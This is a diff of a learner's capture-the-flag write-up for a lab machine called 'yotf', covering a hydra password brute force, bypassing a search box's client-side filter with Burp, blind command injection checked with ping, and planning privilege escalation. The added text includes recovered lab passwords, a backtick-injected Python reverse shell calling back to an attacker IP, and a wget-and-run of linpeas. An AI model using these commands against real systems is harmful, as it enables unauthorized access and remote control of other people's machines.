@@ -206,11 +206,11 @@ then,now i have more information to try another things
 
 	usernames: fox, rascal, nobody
 	shares: $ipc, yotf
-
+	passwords: rascal:quicksilver
 now i'll try brute forcing again and while it isn't done i'm gonna try access smb server with rascal user or nobody and see with i find something 
 
 ```bash
-$ hydra -l rascal -P /usr/share/wordlists/wordlists/rockyou.txt 10.10.71.216 http-head /
+$ hydra -l rascal -P /usr/share/wordlists/wordlists/rockyou.txt 10.10.136.99 http-head / -V -F
 ```
 question 1: why http-head in hydra command?
 
@@ -233,3 +233,114 @@ doesn't have anything in storage but i found two js files,probaly interlinked wi
 but i can't read, maybe can i bypass this "security layer" and inject commands?
 
 
+today is another day and i saw that the password changes every time the machine is turned off, so the password today is another but i already got it :)
+maybe the password will be always in rockyou.txt list so i recommend that you use it 
+
+"gitrdone"
+
+now i gonna deobfuscate the js code to see what the web page is doing 
+
+i'll leave the file in the directory if you want to read :)
+
+ok,the first tip to deobfuscate whatever code is replace the var names and everything that you understand, trust me it helps a lot.
+
+i dont know if i really need to do this but is cool deobfuscating code so... i'll do it anyway and to do this i'm gonna use subl because it's so better in this case. You can use(with the word selected) "Ctrl + D" to find all the times it appears in the code or you can use "Ctrl + Shift + F" to replace all. 
+
+this is the regex that doesn't allow us to type whatever we want
+
+"[ ^a-zA-Z0-9.  ] "
+
+i don't know much about regex but it allows us to type all alfabeth, numbers and points.
+
+dude wtf this code is so messy and confusing javascript is really a weird language.
+
+...i'm regretting it lmao and i'm regretting more because i'm 100% sure that i didn't need to deobfuscate it....but it's ok i'm here to learn 
+
+i really tried so much but this code is giving me headache i gonna die if i try understand it better.
+
+ok,new day again and i've made progress finally.
+
+let's me explain what i did, i stopped at the those "Search!" input that didn't allows me to do what i wanted.
+
+this input has a two security layer, i don't know the real name but i'll split it in two names
+
+	client-side
+	server-side
+
+
+the "client-side" was the regex in javascript file that doesn't allow us to enter some specific characters like " / ; ~ \ " etc etc...But it was only javascript, i.e. this "security layer" exists only in my browser. To bypass it i used BurpSuite to intercept the request and i made other requests from here.
+
+![](attachments/Pasted%20image%2020231018052107.png)
+
+so, how can you see there, i could type whatever that i wanted and i made a request to server BUT i hadn't an rce yet.
+
+now what is come next is the "client-side", look.
+
+![](attachments/Pasted%20image%2020231018052414.png)
+
+even with the javascript verification to not allow us to type specifics characters, there is another verification that check my input in server.
+
+so to bypass i just tried a million different inputs and after much time i saw one person saying that you can use `ping -c 4 $yourip` to see if your commands are being executed.
+
+![](attachments/Pasted%20image%2020231018053815.png)
+
+```bash
+$ sudo tcpdump icmp -n
+```
+to listen all request sends to my machine.
+
+so,now i know that my commands are being executed, i can make a reverse shell using bash or something like this!
+
+i've tried so many shells with so many different forms and this works and i don't know why but now i'm into machine :)
+```
+"ls `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.0\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`"
+```
+
+it didn't work without the slash between ip and "/bin/sh", ls and the grave. Don't ask me why i don't know 
+
+```bash
+$ /usr/bin/python3.6 -c 'import pty;pty.spawn("/bin/bash")'
+```
+to spawn a better shell :)
+
+![](attachments/Pasted%20image%2020231018063418.png)
+
+ok,i've got the web flag in www directory and now i need to escalate privileges to get root.
+
+after a so much i've got...nothing! wtf nothing working to escalate privilege, i'll tell you what i did.
+
+first i serched in www directory but i found nothing, su didn't work, i hadn't any passwords, no files in contrab, no binaries with suid or capabilities.
+
+so i found the creds2.txt in "/var/www/html/files/" or in a somewhere like this.
+
+```bash
+$ cat creds2.txt
+LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAXUTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
+```
+
+so,in my mind i was "YEAH IS IT, WHEN I DECODE THIS, WILL BE AN PASSWORD" but no,i've tried so many different forms to decode this and nothing happens so i gave up....
+
+and i decided run linpeas since that i didn't find literally nothing, then...
+
+```bash
+my machine-
+$ cd /home/akame/tools
+$ python3 -m http.server 8000
+yotf machine-
+$ cd /tmp/
+$ wget http://$myip:8000/linpeas.sh
+$ chmod +x linpeas.sh
+$ ./linpeas.sh
+```
+
+AND....lmao nothing again.
+
+it's a joke, linpeas found some interesting things like a login that i didn't find from where it was and THIS.
+![](attachments/Pasted%20image%2020231018092706.png)
+often i ignore this because i'm dumb. But maybe i can get user fox or rascal with port forwarding thecnique!
+
+i never did it, so it's a new thecnique that i'm gonna learn today! This blog i'll help me with this [juggernaut blog about port forwarding](https://juggernaut-sec.com/port-forwarding-lpe/) . But as you can see in image, there is another ports open running locally(compare with nmap scan), and how are you gonna do this? dunno :D i need to read the blog first wait a minute and i'll explain here too.
+
+
+ALEXIS
+10.10.172.172
